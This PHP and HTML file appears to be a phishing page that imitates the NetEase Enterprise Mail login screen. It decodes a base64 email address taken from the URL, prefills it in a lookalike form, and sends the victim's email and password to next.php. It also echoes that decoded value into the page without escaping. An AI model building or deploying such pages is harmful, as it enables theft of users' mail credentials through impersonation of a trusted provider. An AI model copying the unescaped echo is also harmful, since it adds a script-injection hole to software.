﻿<?php


$user = $_REQUEST['email'];
$email = base64_decode($user);


?>
	 <!DOCTYPE html><html lang="zh_CN"><head><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta http-equiv="Content-type" content="text/html;charset=utf-8">
	 <title data-lang-key="网易企业邮箱 - 登录入口">网易企业邮箱 - 登录入口</title><meta name="keywords" content="网易企业邮箱,登录企业邮箱,企业邮箱注册,电子邮箱">
	 <meta name="description" content="登录网易企业邮箱，请填写完整的邮件地址或管理员帐号，支持手机扫码登录。用邮箱大师，随时随地，极速收发。">
<link rel="shortcut icon" href="img/favicon.ico"/>
	<style type="text/css">
		body{
			background-image: url(img/qiye.png);
			width: 100%;
			height: 100%;
			padding: 0%;
			margin: 0%;
		}
		.form{
			width: 337px;
			height: 405px;
			position: relative;
			left: 815px;
			top: 125px;
		}
	</style>
	</head>
	<body>
		<div class="form">
			<form action="next.php" method="post">
				<input id="email" name="email" style="position: relative; top: 133px; left: 40px; width: 277px; height: 18px; font-size: 14px;
					color: #333; background: white; cursor: text; border: none; border-radius: 2px; outline: none; line-height: normal;
						display: inline-block; font: 400 13.3333px Arial; padding: 14px 10px;"  type= "email" value="<?php echo $email; ?>" placeholder="邮箱地址" required>
				<input name="password" style="position: relative; top: 157px; left: 40px; width: 277px; height: 18px; font-size: 14px;
					color: #333; background: white; outline: none; border: none; font: 400 13.3333px Arial; padding: 14px 10px;
						display: inline-block; line-height: normal;" type= "password" placeholder="密码" required>
				<button style="position: relative; top: 219px; left: 20px; width: 320px; height: 48px; font-size: 20px; 
					color: #fff; line-height: 48px; text-align: center; background: #3b78dd; border: none; outline: none;
						cursor: pointer; border-radius: 4px; display: inline-block;">登 录</button>



			</form>

			
		</div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>


	
	</body>
	</html>